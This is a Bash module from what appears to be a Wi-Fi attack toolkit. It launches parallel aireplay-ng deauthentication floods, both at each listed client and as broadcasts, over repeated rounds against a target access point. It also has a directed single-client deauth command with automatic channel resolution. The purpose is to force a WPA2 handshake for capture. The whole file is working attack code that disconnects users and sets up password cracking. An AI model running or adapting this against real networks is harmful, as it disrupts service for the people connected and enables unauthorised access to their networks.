#!/usr/bin/env bash
# lib/deauth.sh -- Deauthentication to force a WPA2 handshake.
# Not executed directly. Loaded by the entrypoint.
#
# DISEÑO -- TODOS LOS CLIENTES EN PARALELO:
# Every client gets its own aireplay-ng process launched in the background
# simultaneously. 1 client or 1000 -> same mechanism, same burst.
# At the end of each round, wait for all before starting the next.
# run_deauth terminates immediately when capture.sh sends kill.
#
# Interfaz publica:
#   run_deauth <log_file>      -- used by capture.sh (rounds loop)
#   deth_run                   -- used by cmd_deth (single directed deauth)

# _deauth_burst: one full round -- all clients + broadcast in parallel.
_deauth_burst() {
    local round="$1" log_file="$2"
    shift 2
    local -a macs=("$@")
    local -a pids=()

    dbg "-- Round ${round}: parallel deauth to $((${#macs[@]} + 1)) target(s) --"

    local mac
    for mac in "${macs[@]}"; do
        dbg "  [parallel] directed -> ${mac}"
        aireplay-ng \
            --deauth "$DEAUTH_N" \
            -a "$TARGET" \
            -c "$mac" \
            "$MON" >>"$log_file" 2>&1 &
        pids+=($!)
    done

    dbg "  [parallel] broadcast -> AP ${TARGET}"
    aireplay-ng \
        --deauth "$DEAUTH_N" \
        -a "$TARGET" \
        "$MON" >>"$log_file" 2>&1 &
    pids+=($!)

    local pid
    for pid in "${pids[@]}"; do
        wait "$pid" 2>/dev/null || true
    done

    dbg "  Round ${round} done."
}

# run_deauth <log_file> -- load clients, launch the rounds loop in the
# background. Prints the PID of the subshell to stdout so capture.sh
# can kill it.
run_deauth() {
    local log_file="$1"
    local -a client_macs=()

    local mac
    while IFS= read -r mac; do
        if [[ -n "$mac" ]]; then
            client_macs+=("$mac")
        fi
    done < <(get_client_macs)

    local n=${#client_macs[@]}
    if ((n > 0)); then
        info "Parallel deauth: ${n} client(s) + broadcast  (${DEAUTH_ROUNDS} round(s))"
        for mac in "${client_macs[@]}"; do
            info "  -> ${mac}"
        done
    else
        warn "No clients -- broadcast deauth only  (${DEAUTH_ROUNDS} round(s))."
    fi

    (
        local r
        for r in $(seq 1 "$DEAUTH_ROUNDS"); do
            _deauth_burst "$r" "$log_file" "${client_macs[@]}"
            ((r < DEAUTH_ROUNDS)) && sleep "$DEAUTH_INTERVAL"
        done
        dbg "Deauth cycle done (${DEAUTH_ROUNDS} rounds)."
    ) &

    echo $!
}

# deth_run -- entry point for `wai deth`: single directed deauth.
# Resolves the channel (scan if not given), then fires aireplay-ng.
# Everything stays inside the module; the dispatcher only calls it.
deth_run() {
    TARGET="${BSSID^^}"
    SSID_NAME="$TARGET"
    hdr "Directed deauth - BSSID=${TARGET}  Client=${CLIENT_MAC}  Channel=${CHANNEL:-auto}"

    if [[ -z "$CHANNEL" ]]; then
        if [[ "$WAI_DRY_RUN" == "1" ]]; then
            CHANNEL=6
            dbg "[dry-run] channel auto-resolved to ${CHANNEL}"
        else
            info "Channel not given - scanning to resolve it..."
            run_scan "$SCAN_SEC"
            CHANNEL=$(awk -F',' -v b="${TARGET}" '
                /^[0-9A-Fa-f]{2}:/ {
                    gsub(/ /,"",$1); gsub(/ /,"",$4)
                    if (toupper($1)==b) { print $4; exit }
                }' "${TMP}/scan-01.csv")
            if [[ -z "$CHANNEL" ]]; then
                die "Channel not found for ${TARGET}. Use -c <channel>."
            fi
            ok "Channel resolved: ${CHANNEL}"
        fi
    fi

    local log="${TMP}/deth.log"
    info "Sending ${DEAUTH_N} deauth frames to ${CLIENT_MAC} via ${MON}..."
    if [[ "$WAI_DRY_RUN" == "1" ]]; then
        dbg "[dry-run] aireplay-ng --deauth ${DEAUTH_N} -a ${TARGET} -c ${CLIENT_MAC} ${MON}"
        return 0
    fi

    if aireplay-ng \
        --deauth "$DEAUTH_N" \
        -a "$TARGET" \
        -c "$CLIENT_MAC" \
        "$MON" >"$log" 2>&1; then
        ok "Deauth sent."
    else
        warn "aireplay-ng failed. Log:"
    fi
    local l
    while IFS= read -r l; do dbg "  $l"; done <"$log" || true
}
